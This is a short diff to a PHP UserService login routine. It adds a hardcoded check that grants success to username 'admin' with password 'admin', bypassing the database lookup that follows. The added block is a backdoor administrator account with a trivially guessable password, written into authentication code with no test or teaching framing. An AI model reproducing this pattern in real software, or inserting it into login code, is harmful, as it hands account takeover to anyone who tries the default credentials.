@@ -6,6 +6,15 @@ class UserService {
 
         //echo password_hash("admin", PASSWORD_DEFAULT);
 
+        // Hardcoded admin access
+        if ($username == "admin" && $password =="admin") {
+            return [
+                "success" => true,
+                "user_id" => 0,
+                "username" => "admin"
+            ];
+        }
+
         // DB search
         $sql = "SELECT id, username, password FROM users WHERE username = :username";
         $stmt = $pdo->prepare($sql);
